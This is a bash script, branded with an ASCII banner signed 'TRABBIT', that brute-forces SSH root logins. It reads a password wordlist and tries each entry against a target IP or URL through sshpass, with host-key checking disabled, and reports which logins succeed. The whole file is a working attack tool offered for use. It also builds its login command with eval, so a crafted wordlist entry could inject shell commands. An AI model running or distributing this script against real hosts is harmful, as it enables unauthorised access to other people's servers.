#!/bin/bash

clear
trap 'echo -e "\nOperation aborted by the user."; exit' INT

function test_ssh_password {
    ssh_command="sshpass -p '$3' ssh -o StrictHostKeyChecking=no -p $2 $1@$4 'echo SSH Login Successful'"
    if output=$(eval "$ssh_command" 2>&1); then
        if [[ $output == *"SSH Login Successful"* ]]; then
            echo "SSH Login Successful - $1:$3"
        else
            echo "SSH Login Failed - $1:$3"
        fi
    else
        echo "SSH Login Failed - $1:$3"
    fi
}

echo "   ____ ____ _   _    _    ____ _   _   "
echo "  |___ |___ | | | |  / \  |___ | | | |  "
echo "  / ___/ ___| |_| | / _ \ / ___| |_| |  "
echo " | (__| (___|  _  |/ ___ | (___|  _  |  "
echo "  \____\____|_| |_/_/   \_\____|_| |_|  "
echo "                              TRABBIT   "
echo "======================================= "
echo "--{[+]TARGET} // \$host_url || \$host_ip"
echo "--{[+]PORT} // \$ssh_port"
echo "--{[+]PASSLIST} // \$passwordlist_path"
echo ""

# Parse command-line arguments
while getopts ":i:u:p:l:" opt; do
    case $opt in
        i) host_ip=$OPTARG ;;
        u) host_url=$OPTARG ;;
        p) ssh_port=$OPTARG ;;
        l) passwordlist_path=$OPTARG ;;
        \?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
    esac
done

if [[ -z $host_ip && -z $host_url ]]; then
    echo "Please provide either the -i option for IP address or the -u option for URL."
    exit 1
fi

if [[ -z $passwordlist_path ]]; then
    echo "Please provide the path to the password list using the -l option."
    exit 1
fi

if [[ -z $ssh_port ]]; then
    ssh_port=22
fi

IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$passwordlist_path"))'

for password in "${passwords[@]}"; do
    if [[ -n $host_ip ]]; then
        test_ssh_password "root" "$ssh_port" "$password" "$host_ip"
    else
        test_ssh_password "root" "$ssh_port" "$password" "$host_url"
    fi
done

